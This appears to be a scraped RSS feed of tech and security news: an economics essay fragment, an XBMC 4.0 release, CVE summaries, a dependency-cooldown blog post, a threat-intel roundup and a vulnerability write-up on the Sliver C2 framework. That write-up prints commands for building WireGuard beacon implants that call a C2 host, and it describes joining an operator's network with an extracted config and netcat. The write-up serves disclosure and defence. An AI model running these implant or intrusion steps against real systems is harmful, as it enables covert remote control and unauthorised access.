But while they might be greedy, I don’t think they’re dumb. If you do a little math, you can calculate that if airlines were to remove a single row of seats, they could add perhaps 2.5 cm (1 in) of extra legroom for everyone, while only decreasing the number of paying customers by around 3%. (This is based on a 737 with single-class, but you get the idea.)So why don’t airlines rip out a row of seats, raise prices by 3% and enjoy the reduced costs for fuel and customer service? The only answer I can see is that people, on average, aren’t actually willing to pay 3% more for 2.5 cm more legroom. We want a worse but cheaper product, and so that’s what we get.I think this is the most common reason stuff is “bad”. It’s why Subway sandwiches are so soggy, why video games are so buggy, and why IKEA furniture and Primark clothes fall apart so quickly.It’s good when things are bad for this reason. Or at least, that’s the premise of capitalism: When companies cut costs, that’s the invisible hand redirecting resources to maximize social value, or whatever. Companies may be motivated by greed. And you may not like it, since you want to pay zero dollars for infinite value. But this is markets working as designed.Second reason stuff is bad: Information asymmetriesWhy is it that almost every book / blog / podcast about longevity is such garbage? Well, we don’t actually know many things that will reliably increase longevity. And those things are mostly all boring / hard / non-fun. And even if you do all of them, it probably only adds a couple of years in expectation. And telling people these facts is not a good way to find suckers who will pay you lots of money for your unproven supplements / seminars / etc.True! But it doesn’t explain why all longevity stuff is so bad. Why don’t honest people tell the true story and drive all the hucksters out of business? I suspect the answer is that unless you have a  of scientific training and do a  of research, it’s basically impossible to figure out just how huckstery all the hucksters really are.I think this same basic phenomenon explains why some supplements contain heavy metals, why some food contains microplastics, why restaurants use so much butter and salt, why rentals often have crappy insulation, and why most cars seem to only be safe along dimensions included in crash test scores. When consumers can’t tell good from evil, evil triumphs.Third reason stuff is bad: People have bad tasteSometimes stuff is bad because people just don’t appreciate the stuff you consider good. Examples are definitionally controversial, but I think this includes restaurants in cities where all restaurants are bad, North American tea, and travel pants. This reason has a blurry boundary with information asymmetries, as seen in ultrasonic humidifiers or products that use Sucralose instead of aspartame for “safety”.Fourth reason stuff is bad: Pricing powerFinally, sometimes stuff is bad because markets aren’t working. Sometimes a company is selling a product but has some kind of “moat” that makes it hard for anyone else to compete with them, e.g. because of some technological or regulatory barrier, control of some key resource or location, intellectual property, a beloved brand, or network effects.If that’s true, then those companies don’t have to worry as much about someone else stealing their business, and so (because everyone is axiomatically greedy) they will find ways to make their product cheaper and/or raise prices up until the price is equal to the full value it provides to the marginal consumer.Why is food so expensive at sporting events? Yes, people have no alternatives. But people know food is expensive at sporting events. And they don’t like it. Instead of selling water for $17, why don’t venues sell water for $2 and raise ticket prices instead? I don’t know. Probably something complicated, like that expensive food allows you to extract extra money from rich people without losing business from non-rich people.So  dating apps would love to string people along for years instead of finding them long-term relationships, so they keep paying money each month. I wouldn’t be surprised if some people at those companies have literally thought, “Maybe we should string people along for years instead of finding them long-term relationships, so they keep paying money each month, I love money so much.”But if they are actually doing that (which is unclear to me) or if they are bad in some other way, then how do they get away with it? Why doesn’t someone else create a competing app that’s better and thereby steal all their business? It seems like the answer has to be either “because that’s impossible” or “because people don’t really want that”. That’s where the mystery begins.]]></content:encoded></item><item><title>XBMC 4.0 for the Original Xbox</title><link>https://www.xbox-scene.info/articles/announcing-xbmc-40-for-the-original-xbox-r64/</link><author>zdw</author><category>dev</category><pubDate>Fri, 21 Nov 2025 15:18:05 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[
	A new version of Xbox Media Center (XBMC), , has been released. This version marks a significant update to the long-standing media center platform for the Original Xbox. This marks the first major advancement to the software since 2016 and represents a renewed commitment to preserving, modernizing, and extending the capabilities of one of the most  console homebrew applications ever created.

	XBMC has a long and influential history. In 2002, XboxMediaPlayer (XMP) was released and turned the console into a powerful multimedia device fit for the living room in an era when connecting a computer to a TV was quite novel. Later that same year, XMP merged with YAMP and became Xbox Media Player 2.0. A few years later, the software evolved into Xbox Media Center, or XBMC, which introduced a new interface, a plugin system powered by Python, and a robust skinning engine.

	XBMC eventually became so capable that it outgrew the Xbox entirely. By 2007, developers were working on PC ports and in 2010, the project split into two branches: one for general computers while the Xbox version became , and each codebase was maintained from then on by separate teams. XBMC was later renamed to Kodi in 2014 and continues to be one of the most popular media center applications available. Even Plex traces its roots back to XBMC. Plex began as , a Mac port of XBMC in late 2007, before becoming its own project in 2008. This means the Original Xbox helped shape not one but  of the biggest media center apps used today.

	The last official release of XBMC4Xbox arrived in February 2016 with version 3.5.3. Although the community never declared the project dead, meaningful updates became scarce. XBMC 4.0 continues that legacy by bringing a modern interface, updating it to be more inline with Kodi's modern codebase, and backporting features to the original 64MB RAM / Pentium-III hardware where it all began.

	This project is distinct and separate from XBMC4Gamers, the games-focused variation of XBMC4Xbox (v3.5.3) by developer Rocky5.

	A Modern Interface Powered by Estuary

	One of the most notable advancements in XBMC 4.0 is the introduction of the  user interface (skin).

	Estuary, originally released in 2017 with Kodi v17 ("Krypton"), provides a clean and modern layout that improves navigation and readability over past skins. Bringing Estuary to the Xbox required extensive updates to the underlying GUI framework, including a port of the more contemporary  engine. This allows the platform to support modern skinning standards and makes future skin ports much more straightforward. After the initial work of porting GUIlib was done, porting Estuary to the Xbox was a relatively simple process of tweaking a handful of configuration files and adding contextual features specific to the Xbox. The result is a modern, intuitive front end that retains the performance and responsiveness required on legacy hardware.

	Firing up an Xbox made in 2001 and being greeted by the same interface as what you'd find if you were to download Kodi today onto your PC feels like a bit of magic, and helps keep this beloved classic console relevant and useful well into the modern era.

	Expanded Games Library Support

	XBMC 4.0 introduces a fully realized games library system. This enhancement brings the same level of metadata support found in the Movies and Music sections to Xbox and emulated games. Titles can now display artwork, descriptions, and other metadata, transforming the games section into a polished and user-friendly library. XBMC’s longstanding support for trainers remains intact, giving users the option to apply gameplay modifications for compatible titles. Emulated game collections benefit as well, with the ability to browse ROM libraries and launch them directly in a user’s preferred emulator.

	Online Scrapers and Metadata Support

	XBMC 4.0 restores full functionality to metadata scrapers for movies and television. This allows users to build rich media libraries complete with artwork, plot summaries, cast listings, and other information retrieved directly from online sources. XBMC 4.0 handles these tasks efficiently, even on the Xbox’s limited memory and processing power. Video playback continues to support 480p and 720p content, enabling the console to serve as a surprisingly capable media device for its age. Similar to Kodi, XBMC 4.0 supports filtering, building playlists, watch progress history for media, and intelligent handling of TV shows with seasons.

	Aside from scrapers for multimedia, support for rich library capabilities for games has also been added. XBMC has always been a media-first app, and now users can enjoy the library experience that they've come to love for media now in the context of their games library .

	Improved Task Scheduling and Multitasking

	Despite the constraints of the Xbox’s single-threaded 733MHz CPU, XBMC 4.0 includes improvements to task scheduling that allow multiple activities to run concurrently. Background library updates, metadata scraping, and audio/video playback can occur while users navigate and use other parts of the interface. These optimizations help ensure a fluid experience without compromising performance. Much work has been done "under the hood" to keep XBMC on task and within memory budgets while achieving multi-tasking on a console that wasn't exactly designed with it in mind. Users who own RAM and/or CPU upgraded consoles can also take advantage of the extra overhead, as XBMC 4.0 makes use of the extra horsepower for an even smoother experience. Utilizing an SSD with higher UDMA speeds will also yield an improvement in overall responsiveness.

	Music Experience and Visualizers

	Music playback has always been a strong element of XBMC, and version 4.0 maintains that focus. The Original Xbox is capable of high quality audio output, and XBMC continues to support lossless codecs such as FLAC. The release includes compatibility with various audio visualizers, including MilkDrop, which remains one of the most visually impressive and customizable audio visualization engines available. These features allow XBMC 4.0 to function not only as a media organizer, but also as an immersive audio display system.

	An online repository has been established and will be maintained moving forward where users can download legacy and newly-released add-ons as they become available. This repository is accessible without additional setup, right out of the box!

	Add-ons and Python Support

	XBMC 4.0 continues to offer an extendable architecture powered by Python-based add-ons. While the current release uses Python 2.7 for compatibility, work is underway to transition to Python 3.4.10 in the future, which may provide a path for backporting many newer Kodi add-ons. Even in its current state, XBMC 4.0 already supports a variety of community-developed add-ons that extend the system’s functionality, including tools for online video playback (i.e. YouTube), online weather services, and enhanced media organization.

	Updated Settings, Network Services, and System Tools

	The settings interface has been revised to provide more clarity and control. The update includes:

			Playback options, including episode progression, crossfade behavior, and subtitle handling
		
			Network features, such as SMB, FTP, UPnP sharing, web server access, and Insignia-compatible DNS options
		
			Comprehensive interface customization options
		
			Multiple user profiles with individual library settings
		
			Advanced system controls for video calibration, display modes, input devices, and power management
		
			A robust System Information section for diagnostics, with info geared towards the Original Xbox
		
			A flexible File Manager with support for network protocols including FTP, SMB, WebDAV, and more
		
	Users may also take advantage of an online add-ons repository, offering the same experience modern Kodi provides with being able to download add-ons to extend functionality of the app with things like online multimedia providers, weather, skins, visualizers, and more. Developers can submit new add-ons to the official repository via Github.

	XBMC has been a staple of the Original Xbox's homebrew scene since its inception in the early 2000's. This new update is a revival of the platform that helped shape the landscape of home media software and helps revitalize a codebase that has been somewhat stagnant for many years. This release honors that heritage while modernizing the experience for a new generation of enthusiasts and preserving the functionality of the Original Xbox as a versatile and capable media center.

	Although the hardware is decades old, the renewed effort behind XBMC 4.0 demonstrates that the platform still has room to grow and tricks up its sleeve. With ongoing development and a codebase designed with modern Kodi compatibility in mind, XBMC 4.0 represents a significant step forward into the continued development on the Original Xbox.

	The development team looks forward to continuing this work and expanding the possibilities of the Original Xbox for years to come. This version is the first of many to come, with lots of things cooking in the background. Keep an eye out for future releases by joining the  and turning on notifications in the  channel or by periodically checking the project's Github page.

	XBMC 4.0 (and subsequent releases) builds along with source code are available via Github:
Note: XBMC 4.0 is is in active development! This means updates will be released in a more frequent manner for the time being until things settle down. Check the nightly builds section on Github for the most up-to-date version.
	XBMC is open source software and welcomes contributions.
 Developers can help XBMC by , adding new features, making our technology smaller and faster and making development easier for others. XBMC's codebase consists mainly of C++ with small parts written in a variety of coding languages. Our add-ons mainly consist of python and XML.
	 Our support process relies on enthusiastic contributors like you to help others get the most out of XBMC. The #1 priority is always answering questions in our . Everyday new people discover XBMC, and everyday they are virtually guaranteed to have questions.
	 Translate ,  into your native language.
	
	Support and Bug Reporting
 - Primary Developer, Project Lead
	 - Contributor (cURL, wolfSSL), Tester, Debugger
	 - Contrubitor, Tester
	 - Contributor, Tester
	 - Add-ons / Skins Development, Tester
	 - Tester, Feedback
	 - Tester, Feedback
	
	XBMC is . You may use, distribute and copy it under the license terms. XBMC is licensed under the same terms as Kodi. For detailed information on the licensing, please refer to the Kodi license.

	This project, XBMC version 4.0 (and upcoming releases), is distinct from and is not affiliated with Team Kodi of The Kodi Foundation, or its members. 
]]></content:encoded></item><item><title>CVE-2025-41115 - Incorrect privilege assignment</title><link>https://cvefeed.io/vuln/detail/CVE-2025-41115</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 15:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-41115
 Nov. 21, 2025, 3:15 p.m. | 2 days, 2 hours ago
SCIM provisioning was introduced in Grafana Enterprise and Grafana Cloud in April to improve how organizations manage users and teams in Grafana by introducing automated user lifecycle management.

In Grafana versions 12.x where SCIM provisioning is enabled and configured, a vulnerability in user identity handling allows a malicious or compromised SCIM client to provision a user with a numeric externalId, which in turn could allow to override internal user IDs and lead to impersonation or privilege escalation.

This vulnerability applies only if all of the following conditions are met:
- `enableSCIM` feature flag set to true
- `user_sync_enabled` config option in the `[auth.scim]` block set to true
 10.0 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Two suspected Scattered Spider hackers plead not guilty over Transport for London cyberattack</title><link>https://databreaches.net/2025/11/21/two-suspected-scattered-spider-hackers-plead-not-guilty-over-transport-for-london-cyberattack/?pk_campaign=feed&amp;pk_kwd=two-suspected-scattered-spider-hackers-plead-not-guilty-over-transport-for-london-cyberattack</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 21 Nov 2025 15:05:51 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Avast Makes AI-Driven Scam Defense Available for Free Worldwide</title><link>https://www.bleepingcomputer.com/news/security/avast-makes-ai-driven-scam-defense-available-for-free-worldwide/</link><author>Sponsored by Avast</author><category>security</category><pubDate>Fri, 21 Nov 2025 15:00:10 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Avast is rolling out Scam Guardian, a free AI-powered protection layer that analyzes websites, messages, and links to detect rising scam threats. Powered by Gen Threat Labs data, it reveals hidden dangers in code and adds 24/7 scam guidance through the Avast Assistant. [...]]]></content:encoded></item><item><title>We should all be using dependency cooldowns</title><link>https://blog.yossarian.net/2025/11/21/We-should-all-be-using-dependency-cooldowns</link><author>todsacerdoti</author><category>dev</category><pubDate>Fri, 21 Nov 2025 14:50:36 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Programming, philosophy, pedaling.: Dependency cooldowns are a free, easy, and 
way to mitigate the  of open source supply chain attacks.
More individual projects should apply cooldowns (via tools like Dependabot
and Renovate) to their dependencies, and packaging ecosystems should invest
in first-class support for cooldowns directly in their package managers.Some resources for adding cooldowns:“Supply chain security” is a serious problem. It’s also ,
in part because dozens of vendors have a vested financial interest in
convincing your that their  of the underlying problem is (1)
correct, and (2) worth your money.What’s consternating about this is that most open source supply chain
attacks have the same basic structure:An attacker compromises a popular open source project, typically via
a stolen credential or CI/CD vulnerabilty (such as “pwn requests” in
GitHub Actions).The attacker introduces a malicious change to the project and uploads
it somewhere that will have  (PyPI, npm, GitHub releases,
&c., depending on the target).At this point, the , as the attacker has moved
 into the public.Users pick up the compromised version of the project via automatic
dependency updates or a lack of dependency pinning.Meanwhile, the aforementioned vendors are scanning public indices
as well as customer repositories for signs of compromise, and
provide alerts upstream (e.g. to PyPI).Notably, vendors are  to report quickly and loudly upstream,
 as this increases the perceived value of their services in a crowded
 field.Upstreams (PyPI, npm, &c.) remove or disable the compromised package
version(s).End-user remediation begins.The key thing to observe is that the gap between (1) and (2) can be very large
(weeks or months), while the gap between (2) and (5) is :
hours or days. This means that, once the attacker has moved into the actual
exploitation phase, their  to cause damage is pretty limited.We can see this with numerous prominent supply chain attacks over the last 18 months:(Each of these attacks has significant downstream effect, of course, but only
 their window of opportunity. Subsequent compromises from each, like
Shai-Hulud, represent  windows of opportunity where the attackers regrouped
and pivoted onto the  set of compromised credentials.)My takeaway from this: some windows of opportunity are bigger, but the 
of them are under a week long. Consequently, ordinary developers can  of these types of attacks by instituting  on their dependencies.A “cooldown” is exactly what it sounds like: a window of time between when a dependency
is published and when it’s considered suitable for use. The dependency is public during
this window, meaning that “supply chain security” vendors can work their magic
while the rest of us wait any problems out.I  cooldowns for several reasons:They’re empirically effective, per above. They won’t stop  attackers,
but they  stymie the majority of high-visibiity, mass-impact supply chain
attacks that have become more common.This is how simple it is in Dependabot:(Rinse and repeat for other ecosystems as needed.)Cooldowns enforce positive behavior from supply chain security vendors:
vendors are still incentivized to discover and report attacks quickly,
but are  as incentivized to emit volumes of blogspam about “critical”
attacks on largely underfunded open source ecosystems.Concluding / assorted thoughtsIn the very small sample set above, 8/10 attacks had windows of opportunity
of less than a week. Setting a cooldown of 7 days would have prevented
the vast majority of these attacks from reaching end users (and causing
knock-on attacks, which several of these were). Increasing the cooldown to 14
days would have prevented all but 1 of these attacks.Cooldowns are, obviously, : some attackers  evade detection,
and delaying the inclusion of potentially malicious dependencies by a week
(or two) does not fundamentally alter the fact that supply chain security is a
 problem, not a purely technical one. Still, an 80-90% reduction
in exposure through a technique that is free and easy seems hard to beat.Related to the above, it’s unfortunate that cooldowns aren’t baked 
into more packaging ecosystems: Dependabot and Renovate are great, but
 would be if the package manager itself (as the source of ground
truth) could enforce cooldowns directly (including of dependencies not
introduced or bumped through automated flows).]]></content:encoded></item><item><title>CVE-2025-11127 - Mstoreapp Mobile (App &lt;= 2.08, Multivendor &lt;= 9.0.1) - Unauthenticated Privilege Escalation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-11127</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 14:15:59 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-11127
 Nov. 21, 2025, 2:15 p.m. | 2 days, 3 hours ago
The Mstoreapp Mobile App WordPress plugin through 2.08 and Mstoreapp Mobile Multivendor through 9.0.1 do not properly verify users identify when using an AJAX action, allowing unauthenticated users to retrieve a valid session for arbitrary users by knowing their email address.
 9.8 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>Kritiek RCE-lek in Oracle Identity Manager mogelijk misbruikt bij aanvallen</title><link>https://www.security.nl/posting/913926/Kritiek+RCE-lek+in+Oracle+Identity+Manager+mogelijk+misbruikt+bij+aanvallen?channel=rss</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 14:11:43 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Een kritieke kwetsbaarheid in Oracle Identity Manager is mogelijk weken voor het uitkomen van een beveiligingsupdate misbruikt door aanvallers, zo meldt het Internet Storm Center (ISC). Op 21 oktober  ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>The Good, the Bad and the Ugly in Cybersecurity – Week 47</title><link>https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-47-7/</link><author>SentinelOne</author><category>threatintel</category><enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/11/GBU_week47-1.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 14:00:42 +0000</pubDate><source url="https://www.sentinelone.com/">SentinelOne Blog</source><content:encoded><![CDATA[The Good | Courts Prosecute DPRK Fraud, Ransomware Hosting & Crypto Mixer OpsFive people have pleaded guilty to helping the DPRK run illicit revenue schemes involving remote IT worker fraud and cryptocurrency theft. The group . The DOJ is also seeking forfeiture of $15 million tied to APT38 cyber-heists. The defendants, Oleksandr Didenko, Erick Prince, Audricus Phagnasay, Jason Salazar, and Alexander Travis, admitted to stealing U.S. identities for overseas workers and laundering stolen funds.In the U.S., U.K., and Australia,  to support malware delivery, phishing attacks, and illicit content hosting. To help cybercriminals evade capture, BPH services ignore abuse reports and law enforcement takedowns. OFAC has sanctioned Media Land, its sister companies, and three executives all tied to LockBit, BlackSuit, Play, and other threat groups. Five Eyes agencies also released guidance to help ISPs detect and block malicious infrastructure used by BPH services.The founders of . Operating since 2015, Samourai used its ‘Whirlpool’ mixing system and ‘Ricochet’ multi-hop transactions to obscure Bitcoin flows. These features made tracing more difficult and enabled criminals involved in darknet markets, drug trafficking, and cybercrime to launder more than $2 billion. Authorities seized the platform, including its servers, domains, and mobile app, while the founders agreed to forfeit all traceable proceeds. CEO Keonne Rodriguez has received five years, while CTO William Lonergan Hill received four along with supervised release. The pair were ordered to pay fines of $250,000 each.The Bad | DPRK Actors Build Fake Job Platform to Lure AI Talent & Push MalwareAs part of their ongoing and evolving Contagious Interview campaign, , particularly in the AI research, software development, and cryptocurrency verticals. While earlier fraudulent IT-worker schemes relied on targeting individuals through phishing on social media platforms, the latest tactic weaponizes a fully functional hiring pipeline.Researchers discovered the latest lure – a -based job portal hosted at , complete with dozens of fabricated AI and crypto-industry job listings. The listings mimic branding from major tech companies and feature a polished UI and full recruitment workflow that mirrors modern hiring systems, encouraging applicants to submit resumes and professional links before prompting them to record a video introduction.This final step triggers the DPRK-favored ClickFix technique: When applicants copy the fake interview instructions, a hidden clipboard hijacker swaps their text with a multi-stage malware command. When pasted into a terminal, it downloads and executes staged payloads under the guise of a “driver update”, ultimately launching a VBScript-based loader. This design blends seamlessly with typical remote-work interview processes and dramatically increases the likelihood of accidental execution.The platform also performs strategic filtering, attracting . The campaign reflects significant maturation in DPRK social engineering tradecraft, pairing high-fidelity UI design with covert malware delivery. Job seekers are advised to verify domains, avoid off-platform hiring systems, and execute any requested code only in sandboxed environments.The Ugly | Iran-Backed Actors Weaponize Cyber Recon to Power Real-World AttacksIranian-linked threat actors are using cyber operations to support real-world military activity, a pattern described by researchers as “cyber-enabled kinetic targeting”.In the past, conventional security models separated cyber and physical domains – delineations that are proving artificial in today’s socioeconomic and political climate. Now, these are .One example involves Crimson Sandstorm ( Tortoiseshell and TA456), a group tied to Iran’s Islamic Revolutionary Guard Corps (IRGC). Between December 2021 and January 2024, the group probed a ship’s Automatic Identification System (AIS) before expanding their operations to other maritime platforms. On January 27, 2024, the group searched for AIS location data on one particular shipping vessel. Days later, that same ship was targeted in an unsuccessful missile strike by Iranian-backed Houthi forces, which have mounted repeated missile attacks on commercial shipping in the Red Sea amid the Israel–Hamas conflict.A second case highlights Mango Sandstorm ( Seedworm and TA450), a group affiliated with Iran’s Ministry of Intelligence and Security (MOIS). In May, the group set up infrastructure for cyber operations and gained access to compromised CCTV feeds in Jerusalem to gather real-time visual intelligence. Just a month later, the Israel National Cyber Directorate confirmed Iranian attempts to access cameras during large-scale attacks, reportedly to get feedback on where the missiles hit and improve precision. Both highlighted cases show the attackers’ reliance on routing traffic through anonymizing VPNs to prevent attribution.The divide between digital intrusions and physical warfare continues to blur. With .]]></content:encoded></item><item><title>Making a Small RPG</title><link>https://jslegenddev.substack.com/p/making-a-small-rpg</link><author>ibobev</author><category>dev</category><pubDate>Fri, 21 Nov 2025 13:23:16 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Sliver C2 vulnerability enables attack on C2 operators through insecure Wireguard network</title><link>https://hngnh.com/posts/Sliver-CVE-2025-27093/</link><author>/u/catmandx</author><category>netsec</category><pubDate>Fri, 21 Nov 2025 13:19:57 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Sliver is a powerful command and control (C2) framework designed to provide advanced capabilities for covertly managing and controlling remote systems.Sliver supports Wireguard as a transport protocol with a custom Wireguard netstack. It is popular due to the open-source nature as well as extensibility, ease-of-use, and compatibility with Cobalt Strike BOFs. In versions 1.5.43 and earlier, the netstack does not limit traffic between Wireguard clients. This allows clients to communicate with each other without restrictions, potentially enabling leaked or recovered keypairs to be used to  or allowing port forwardings to be accessible from other implants.These Sliver versions are affected: Sliver 1.5.43 and earlier.Operators that use Wireguard protocol transport and port forwarding to access implants.Notes: images use colored border to show you where the command is executed:When the C2 Operator use the Wireguard functionality in Sliver, they need to:Create a Wireguard listener (a peer).
      sliver > wg -l 10002 -p

  [*] Starting Wireguard listener
  [*] Successfully started job #1
Now Sliver is listening on UDP port 10002 for Wireguard connections.Create an implant with the  option.
      sliver > generate beacon --wg c2.server.com:10002 --debug --skip-symbols --name beacon-wg
This will embed a wireguard peer configuration inside the implant.Execute the implant on the victim’s machine:
      Victim powershell $ .\beacon-wg.exe

  Now the implant becomes a Wireguard peer. The beacon should pop up on the operator’s sliver console:
  
  We can see the Wireguard private IP assigned to it is 100.64.0.4.Create operator Wireguard config:
      sliver > wg-config -s ./data/wireguard/wg_confs/wg0.conf
The operator connect his own machine to the wireguard listener:
      bash # wg-quick up wg0
  bash # ip a
We can see the Wireguard private IP assigned to the operator is 100.64.0.2.To facilitate port forwarding, Sliver implement the wireguard network stack to forward any packets between peers, this essentially create a traditional hub-and-spoke VPN server. Traffic between wireguard peers are not filtered .On the Sliver server and on the victim machine, the wireguard connection is not exposed as a network interface, it lives entirely inside the process.Crucially, if the operator uses  or any equivalent commands, they are creating a network interface on their machine. If they have any services listening on 0.0.0.0 (SSH, RDP, SMB, HTTP, etc), those services can also be accessed on the 100.64.0.2 interface by other wireguard peers.We can verify this behavior by perform pings from both sides:On the operator machine, we can ping the beacon since the OS knows where to send ICMP packets:In contrast, the victim machine is not aware that there’s a VPN connection since it only lives inside the beacon process, thus the ping fails:If a defender or malicious client get ahold of the wireguard config used by the client, then they can connect to the Sliver wireguard listener, and connect to the operator’s wireguard interface. Getting the wireguard connection config from the beacon is outside the scope of this article, the wireguard config is embedded into the beacon at compile time, as well as existing in memory, you can dump the memory or use some static analysis tool to retrieve the sliver wireguard. listener address, private key of the beacon and public key of the sliver listener.First you have to obtain a valid wireguard config, there are several ways to do this, exercise left to the reader, then creating a network interface using it:The victim can connect to the operator’s machine:Assuming the operator is running an HTTP server on their machine, the victim can now connect to it, the same applies to any services listening on 0.0.0.0:If the operator has set up port forwarding to access services inside a victim’s internal network, something like 100.64.0.4:1080 –> internal-ad-server.corp.local:445Then other victims/beacons can also connect to that port forward, though this require some serious guesswork:When the beacon is executed on the victim machine, it will notify the Sliver server that a beacon has connected. This will only happen if you let the beacon finish handshaking with the server. This process is as follows:Step 1: the beacon use the embedded wireguard peer config to establish connection with the server. This embedded config will be shared with every other beacon, so it will only be used to initiate the connection before switching to a new config.Step 2: the beacon connect to 100.64.0.1:1337 (default key exchange endpoint) and receive a new, unique wireguard peer config.Step 3: perform handshake and let the operator know the beacon is online.If you are able to extract the initial Wireguard peer configuration, you can use it as-is to connect to the Wireguard listener, but if you keep using it, other beacons with the same executable will not be able to connect back, so this will generate some suspicion on the operator’s side.If the operator use the default configuration, you can use netcat to connect to 100.64.0.1:1337 and get a new, unencrypted Wireguard config unique to you, this way you gain access to the network while not letting them know you are there, the Sliver console does not have a way to show how many Wireguard config has been created, or how many is currently connected.https://github.com/BishopFox/sliver/security/advisories/GHSA-q8j9-34qf-7vq7https://nvd.nist.gov/vuln/detail/CVE-2025-27093]]></content:encoded></item><item><title>Google begins showing ads in AI Mode (AI answers)</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/google-begins-showing-ads-in-ai-mode-ai-answers/</link><author>Mayank Parmar</author><category>security</category><pubDate>Fri, 21 Nov 2025 13:02:11 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google has started rolling out ads in AI mode, which is the company's "answer engine," not a search engine. [...]]]></content:encoded></item><item><title>Google Brings AirDrop Compatibility to Android’s Quick Share Using Rust-Hardened Security</title><link>https://thehackernews.com/2025/11/google-adds-airdrop-compatibility-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiId5Cf7YMovzRkPOI6S1tm4fgDKNLcFvdg3ASml-f-mWCwj0rtSAZJ-P4jmORklaJoflcXdYLEVk_EjwXMqcoy7e0c_-fAPSpE_8R5Nvt5cc4VTxf-D1Nh-8qXuAeFjKR6-TcLvZxT1o2D46Iv9dGvkNNWv79ce2E-DzN4FC6XSsQM1QxgylI1fmDMhU4E/s1600/android.jpg" length="" type=""/><pubDate>Fri, 21 Nov 2025 13:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[In a surprise move, Google on Thursday announced that it has updated Quick Share, its peer-to-peer file transfer service, to work with Apple's equipment AirDrop, allowing users to more easily share files and photos between Android and iPhone devices.
The cross-platform sharing feature is currently limited to the Pixel 10 lineup and works with iPhone, iPad, and macOS devices, with plans to expand]]></content:encoded></item><item><title>How a French judge was digitally cut off by the USA</title><link>https://www.heise.de/en/news/How-a-French-judge-was-digitally-cut-off-by-the-USA-11087561.html</link><author>i-con</author><category>dev</category><pubDate>Fri, 21 Nov 2025 12:12:41 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Digital sovereignty has been much discussed in Europe in recent weeks, most recently during a German-French summit in Berlin. The extent of dependence on the USA in the digital sector is currently being experienced by a French judge. Nicolas Guillou, one of six judges and three prosecutors of the International Criminal Court (ICC), was sanctioned by the USA in August. He described his current situation as a digital time travel back to the 1990s, before the internet age, in a recent interview.The reason for the US sanctions are the arrest warrants against Israeli Prime Minister Benjamin Netanyahu and Defense Minister Yoav Gallant. They were indicted for war crimes and crimes against humanity in the context of the destruction of the Gaza Strip. The USA condemned this decision by the court, whereupon the US Treasury Department sanctioned six judges and three prosecutors.Digitally excluded from almost everythingIn Guillou's daily life, this means that he is excluded from digital life and much of what is considered standard today, he told the French newspaper Le Monde. All his accounts with US companies such as Amazon, Airbnb, or PayPal were immediately closed by the providers. Online bookings, such as through Expedia, are immediately canceled, even if they concern hotels in France. Participation in e-commerce is also practically no longer possible for him, as US companies always play a role in one way or another, and they are strictly forbidden to enter into any trade relationship with sanctioned individuals.He also describes the impact on participating in banking as drastic. Payment systems are blocked for him, as US companies like American Express, Visa, and Mastercard have a virtual monopoly in Europe. He also describes the rest of banking as severely restricted. For example, accounts with non-US banks have also been partially closed. Transactions in US dollars or via dollar conversions are forbidden to him.Judge: EU should block sanctionsGuillou's case shows how strong the USA's influence in the tech sector is and how few options he has to circumvent it. And this at a time when an account with a US tech company is considered a matter of course in more and more places.The French judge advocates for Europe to gain more sovereignty in the digital and banking sectors. Without this sovereignty, the rule of law cannot be guaranteed, he warns. At the same time, he calls on the EU to activate an existing blocking regulation (Regulation (EC) No 2271/96) for the International Criminal Court, which prevents third countries like the USA from enforcing sanctions in the EU. EU companies would then no longer be allowed to comply with US sanctions if they violate EU interests. Companies that violate this would then be liable for damages.This article was originally published in
      
        German.
      
